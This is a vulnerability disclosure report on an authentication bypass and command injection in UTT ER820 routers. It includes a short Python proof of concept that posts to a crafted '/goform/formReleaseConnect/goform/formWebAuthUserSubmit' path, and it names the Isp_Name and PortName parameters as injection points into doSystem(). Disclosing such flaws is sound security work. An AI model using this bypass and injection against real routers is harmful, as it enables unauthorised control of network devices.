# CVE Report - Authentication Bypass and Command Injection Vulnerability in UTT ER820 Routers

## Vulnerability Title

Authentication Bypass and Command Injection Vulnerability in UTT ER820 Routers (formReleaseConnect / sub_451284)

## Vulnerability Description

UTT ER820 devices expose the GoAhead `websFormHandler` endpoint `formReleaseConnect` (mapped to function `sub_451284`, ranges `0x4512c0-0x4513dc` / `0x4512c0-0x451400` / `0x4512c0-0x451454` / `0x45137c-0x4513dc` / `0x45137c-0x451400` / `0x45137c-0x451454`) which can be reached via an authentication bypass, and then abused for command injection. Remote attackers can inject commands via the POST parameter `Isp_Name` (or `PortName`), which is later passed into `doSystem()`.

## POC

```py
import requests
import sys

def exploit(base_url: str):
    url = base_url.rstrip('/') + '/goform/formReleaseConnect/goform/formWebAuthUserSubmit'
    data = {
        'Isp_Name': 'cmd',
    }
    requests.post(url, data=data, timeout=5)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('usage: python poc.py http://target')
        raise SystemExit(1)
    exploit(sys.argv[1])
    print('sent')
```

## Cause Analysis

1. **authentication**: In `websSecurityHandler`, the presence of `/goform/formWebAuthUserSubmit` or `/goform/formWebAuthOk` in the request path triggers a direct dispatch to `websFormHandler`. By crafting `/goform/formReleaseConnect/goform/formWebAuthUserSubmit`, attackers can bypass authentication and reach the `formReleaseConnect` handler.

2. **command injection**: In `sub_451284`, user input is obtained from `Isp_Name` (or fallback `PortName`) via `websGetVar` and used as `%s` arguments to `doSystem()` (e.g., `doSystem("ppp-off %s", v7)`, `doSystem("wan.sh %s", Var)`, `doSystem("udhcpc-down.sh %s", Var)`) without sanitization. If the value contains shell metacharacters, this leads to arbitrary command execution.
